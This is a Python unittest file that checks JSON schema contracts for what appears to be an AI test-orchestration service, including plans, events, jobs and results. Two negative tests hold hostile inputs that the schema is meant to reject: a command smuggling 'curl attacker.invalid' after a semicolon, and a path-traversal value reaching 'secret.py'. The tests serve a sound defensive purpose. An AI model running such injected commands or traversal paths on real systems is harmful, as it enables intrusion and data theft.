from __future__ import annotations

import copy
import json
import unittest
from pathlib import Path
from typing import Any

import yaml
from jsonschema import Draft202012Validator, FormatChecker

REPOSITORY_ROOT = Path(__file__).resolve().parents[2]
CONTRACTS = REPOSITORY_ROOT / "contracts"


def load_json(path: Path) -> dict[str, Any]:
    return json.loads(path.read_text(encoding="utf-8"))


class ContractSchemaTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.schemas = {
            path.name: load_json(path)
            for path in sorted(CONTRACTS.glob("*.schema.json"))
        }

    def assert_valid(self, schema_name: str, instance: dict[str, Any]) -> None:
        validator = Draft202012Validator(
            self.schemas[schema_name], format_checker=FormatChecker()
        )
        errors = sorted(
            validator.iter_errors(instance), key=lambda error: list(error.path)
        )
        self.assertEqual([], errors, "\n".join(error.message for error in errors))

    def assert_invalid(self, schema_name: str, instance: dict[str, Any]) -> None:
        validator = Draft202012Validator(
            self.schemas[schema_name], format_checker=FormatChecker()
        )
        self.assertTrue(list(validator.iter_errors(instance)))

    def test_all_contracts_are_valid_draft_2020_12_schemas(self) -> None:
        self.assertEqual(
            {
                "events.schema.json",
                "generation-result.schema.json",
                "test-draft.schema.json",
                "test-job.schema.json",
                "test-plan.schema.json",
                "test-result.schema.json",
            },
            set(self.schemas),
        )
        for schema in self.schemas.values():
            Draft202012Validator.check_schema(schema)

    def test_example_plan_is_valid(self) -> None:
        plan = yaml.safe_load(
            (REPOSITORY_ROOT / "docs" / "test-plans" / "example.yaml").read_text(
                encoding="utf-8"
            )
        )
        self.assert_valid("test-plan.schema.json", plan)

    def test_plan_rejects_non_full_sha(self) -> None:
        plan = self._example_plan()
        plan["base_sha"] = "abc123"
        self.assert_invalid("test-plan.schema.json", plan)

    def test_plan_rejects_path_traversal(self) -> None:
        plan = self._example_plan()
        plan["scope"]["allowed_test_paths"] = ["tests/../app/secret.py"]
        self.assert_invalid("test-plan.schema.json", plan)

    def test_plan_rejects_shell_text_instead_of_command_id(self) -> None:
        plan = self._example_plan()
        plan["commands"]["unit"] = "python -m unittest; curl attacker.invalid"
        self.assert_invalid("test-plan.schema.json", plan)

    def test_plan_rejects_unknown_schema_version_and_fields(self) -> None:
        plan = self._example_plan()
        plan["schema_version"] = "2.0"
        plan["untrusted"] = True
        self.assert_invalid("test-plan.schema.json", plan)

    def test_runner_event_is_valid(self) -> None:
        event = {
            "schema_version": "1.0",
            "event_id": "evt_01JTESTEVENT",
            "attempt": 1,
            "phase": "TEST",
            "status": "FAILED",
            "code_sha": "b" * 40,
            "artifacts": [],
            "summary": {"passed": 4, "failed": 1, "skipped": 0},
            "occurred_at": "2026-09-19T12:00:00Z",
        }
        self.assert_valid("events.schema.json", event)

    def test_runner_event_rejects_invalid_status_and_timestamp(self) -> None:
        event = {
            "schema_version": "1.0",
            "event_id": "evt_01JTESTEVENT",
            "attempt": 1,
            "phase": "TEST",
            "status": "UNKNOWN",
            "artifacts": [],
            "summary": {},
            "occurred_at": "yesterday",
        }
        self.assert_invalid("events.schema.json", event)

    def test_job_status_response_is_valid(self) -> None:
        job = {
            "schema_version": "1.0",
            "job_id": "atj_" + "1" * 32,
            "task_id": "TASK-123",
            "repository": "github.com/Luseramia/ai-orchestrator",
            "branch": "main",
            "base_sha": "a" * 40,
            "code_sha": None,
            "tested_sha": None,
            "status": "PREPARE_QUEUED",
            "prepare_attempt": 0,
            "verify_attempt": 0,
            "version": 0,
            "failure_class": None,
            "failure_message": None,
            "artifacts": [],
            "created_at": "2026-09-19T12:00:00Z",
            "updated_at": "2026-09-19T12:00:00Z",
            "completed_at": None,
        }
        self.assert_valid("test-job.schema.json", job)

    def test_test_draft_is_valid(self) -> None:
        draft = {
            "schema_version": "1.0",
            "job_id": "atj_" + "2" * 32,
            "task_id": "TASK-123",
            "base_sha": "a" * 40,
            "summary": "Add focused unit coverage for the request service.",
            "proposed_tests": [
                {
                    "test_case_id": "TC-001",
                    "acceptance_criteria": ["AC-001"],
                    "level": "unit",
                    "path": "tests/test_request.py",
                    "description": "Exercises the public request behavior.",
                }
            ],
            "risks": [],
            "command_ids": ["python-unittest-all"],
        }
        self.assert_valid("test-draft.schema.json", draft)

    def test_generation_result_is_valid(self) -> None:
        result = {
            "schema_version": "1.0",
            "job_id": "atj_" + "2" * 32,
            "task_id": "TASK-123",
            "base_sha": "a" * 40,
            "code_sha": "b" * 40,
            "summary": "Generated the planned unit test.",
            "created_tests": [
                {
                    "path": "tests/test_service.py",
                    "test_case_ids": ["TC-001"],
                    "acceptance_criteria": ["AC-001"],
                }
            ],
            "covered_test_cases": ["TC-001"],
            "uncovered_test_cases": [],
            "risks": [],
        }
        self.assert_valid("generation-result.schema.json", result)

    def test_test_result_is_valid(self) -> None:
        result = {
            "schema_version": "1.0",
            "job_id": "atj_" + "2" * 32,
            "task_id": "TASK-123",
            "base_sha": "a" * 40,
            "tested_sha": "b" * 40,
            "patch_sha256": "c" * 64,
            "status": "PASSED",
            "started_at": "2026-09-19T12:00:00Z",
            "completed_at": "2026-09-19T12:00:01Z",
            "duration_seconds": 1,
            "summary": {"passed": 1, "failed": 0, "skipped": 0},
            "commands": [
                {
                    "name": "unit",
                    "command_id": "python-unittest-all",
                    "exit_code": 0,
                    "duration_seconds": 1,
                    "timed_out": False,
                }
            ],
            "coverage": None,
            "failures": [],
            "artifacts": [],
            "uncovered_acceptance_criteria": [],
        }
        self.assert_valid("test-result.schema.json", result)

    @staticmethod
    def _example_plan() -> dict[str, Any]:
        return copy.deepcopy(
            yaml.safe_load(
                (REPOSITORY_ROOT / "docs" / "test-plans" / "example.yaml").read_text(
                    encoding="utf-8"
                )
            )
        )


if __name__ == "__main__":
    unittest.main()
